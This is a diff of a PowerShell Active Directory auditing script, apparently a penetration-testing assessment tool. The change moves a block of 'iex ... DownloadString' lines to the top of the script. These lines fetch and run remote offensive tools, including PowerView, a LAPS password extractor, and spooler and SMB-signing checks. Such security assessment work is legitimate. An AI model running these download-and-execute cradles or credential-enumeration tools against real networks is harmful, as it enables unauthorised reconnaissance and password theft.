@@ -28,6 +28,19 @@ $ErrorActionPreference = "SilentlyContinue"
 #Dot Source required Function Libraries
 #. "C:\Scripts\Functions\Logging_Functions.ps1"
 
+#------------------------------------------------[Scripts and Modules]-------------------------------------------------------
+# Load RSAT functions
+Import-Module .\Microsoft.ActiveDirectory.Management.dll
+# Active enum using toolz (Connection required)
+# Loading toolset
+iex(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1")
+iex(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-LdapSignCheck.ps1")
+iex(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/NotMedic/NetNTLMtoSilverTicket/master/Get-SpoolStatus.ps1")
+iex(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/kfosaaen/Get-LAPSPasswords/master/Get-LAPSPasswords.ps1")
+iex(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/michiiii/Check-SMBSigning/master/Check-SMBSigning.ps1")
+iex(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/michiiii/SmbScanner/master/Check-SMBv1.ps1")
+
+
 #----------------------------------------------------------[Declarations]----------------------------------------------------------
 
 #Script Version
@@ -765,7 +778,7 @@ $rprn = New-Object PingCastle.ExtractedCode.rprn
 
 ## END Variabled for Spooler check
 
-#-----------------------------------------------------------[Functions]------------------------------------------------------------
+#-----------------------------------------------------[Functions]------------------------------------------------------------
 function Test-Port {
   [CmdletBinding()]
   param (
@@ -2196,18 +2209,6 @@ $AdminGroups = @{'Domain Admins' = "$domainSID-512"
                  'Remote Desktop Users'= "S-1-5-32-555"
                  'DnsAdmins'= "$DNSAdminsSID"
                 }
-
-
-# Active enum using toolz (Connection required)
-# Loading toolset
-iex(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1")
-iex(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-LdapSignCheck.ps1")
-iex(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/NotMedic/NetNTLMtoSilverTicket/master/Get-SpoolStatus.ps1")
-iex(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/kfosaaen/Get-LAPSPasswords/master/Get-LAPSPasswords.ps1")
-iex(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/michiiii/Check-SMBSigning/master/Check-SMBSigning.ps1")
-iex(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/michiiii/SmbScanner/master/Check-SMBv1.ps1")
-
-
 
 Write-Host '#########################################################' -BackgroundColor Black
 Write-Host '##           Unusual Primary Group IDs                 ##' -BackgroundColor Black
